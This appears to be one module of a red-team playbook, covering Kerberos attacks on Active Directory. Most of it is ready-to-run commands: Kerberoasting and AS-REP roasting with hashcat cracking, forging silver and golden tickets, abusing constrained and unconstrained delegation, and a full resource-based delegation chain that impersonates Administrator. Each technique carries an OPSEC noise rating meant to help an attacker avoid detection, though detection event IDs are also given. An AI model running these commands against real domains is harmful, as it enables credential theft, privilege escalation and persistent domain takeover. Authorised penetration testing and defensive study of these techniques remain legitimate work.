# Kerberos Attacks

tags: kerberos, kerberoast, asreproast, spn, service-account, cracking, credential, active-directory, silver-ticket, golden-ticket, delegation, rbcd, constrained, unconstrained

## Objective
Exploit Kerberos protocol weaknesses: roast service accounts, forge tickets, abuse delegation for privilege escalation.

## Prerequisites
- Valid domain user credential (any privilege level) for roasting
- Domain controller reachable on port 88
- For ticket forging: compromised service account hash or krbtgt hash

## Methodology

### Kerberoasting (OPSEC: 0.6)
```bash
# Enumerate and request TGS tickets
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip DC -request -outputfile hashes.kerberoast

# Via nxc
nxc ldap DC -u user -p pass --kerberoasting output.txt

# Targeted kerberoast — single account
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip DC -request-user target_svc

# Crack with hashcat
hashcat -m 13100 hashes.kerberoast wordlist.txt -r best64.rule
```
**Targeted Kerberoasting** (requires GenericWrite): Set SPN on target → roast → remove SPN.

### AS-REP Roasting (OPSEC: 0.3)
```bash
# Find accounts with "Do not require Kerberos preauthentication"
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep.txt wordlist.txt -r OneRuleToRuleThemAll.rule
```
LDAP filter: `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`. Detection: Event 4768 with PreAuthType 0.

### Silver Ticket (OPSEC: 0.2 — no DC contact)
```bash
# Forge a service ticket with compromised service account hash
impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain dom.com \
  -spn cifs/target.dom.com user
export KRB5CCNAME=user.ccache
impacket-psexec dom.com/user@target.dom.com -k -no-pass
```

### Golden Ticket (OPSEC: 0.3)
```bash
# Forge a TGT with krbtgt hash — prerequisite: krbtgt hash from DCSync
impacket-ticketer -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-xxx \
  -domain dom.com Administrator
export KRB5CCNAME=Administrator.ccache
```
Persists until krbtgt rotated **twice**.

### Constrained Delegation (OPSEC: 0.5)
```bash
# Find delegation configurations
impacket-findDelegation DOMAIN/user:pass -dc-ip DC

# Abuse constrained delegation — impersonate admin to target service
impacket-getST -spn cifs/target.dom.com -impersonate Administrator \
  'DOMAIN/svc:pass'
export KRB5CCNAME=Administrator@cifs_target.dom.com@DOMAIN.COM.ccache
```

### Unconstrained Delegation (OPSEC: 0.6)
Coerce auth (PetitPotam/PrinterBug) to unconstrained host → capture TGT:
```bash
# Monitor for incoming TGTs on compromised unconstrained delegation host
Rubeus.exe monitor /interval:5 /nowrap
# Inject captured ticket → DCSync
```

### RBCD Full Chain (OPSEC: 0.5)
```bash
# 1. Create a machine account (requires MAQ > 0)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss' \
  -dc-ip DC 'DOMAIN/user:pass'

# 2. Configure RBCD — delegate from EVIL$ to TARGET$
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -dc-ip DC \
  -action write 'DOMAIN/user:pass'

# 3. Request service ticket impersonating admin
impacket-getST -spn cifs/TARGET.dom.com -impersonate Administrator \
  -dc-ip DC 'DOMAIN/EVIL$:P@ss'
```
Detection: Event 4741 (computer created), 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity modified), 4769 with S4U flags.

## Graph Reporting
- **Credential nodes**: from cracked Kerberoast/AS-REP hashes (`cred_type: plaintext`)
- **VALID_ON edges**: cracked credential → user node
- **ADMIN_TO edges**: where cracked cred grants admin access
- **DELEGATES_TO edges**: delegation configurations
- **ALLOWED_TO_ACT edges**: RBCD configurations

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Kerberoasting (bulk) | 0.6 |
| Kerberoasting (targeted) | 0.3 |
| AS-REP Roasting | 0.3 |
| Silver Ticket | 0.2 |
| Golden Ticket | 0.3 |
| Constrained Delegation | 0.5 |
| Unconstrained Delegation | 0.6 |
| RBCD chain | 0.5 |

**Detection**: Event 4769 (TGS requests), 4768 PreAuthType 0 (AS-REP), 4741 (computer creation), 5136 (RBCD attribute modification). ATA/MDI detects bulk Kerberoast and honeypot SPN access.

## Sequencing
- **After**: AD Discovery (need user list, SPN info, delegation info)
- **Feeds →**: Credential Dumping, Lateral Movement, AD Privilege Escalation
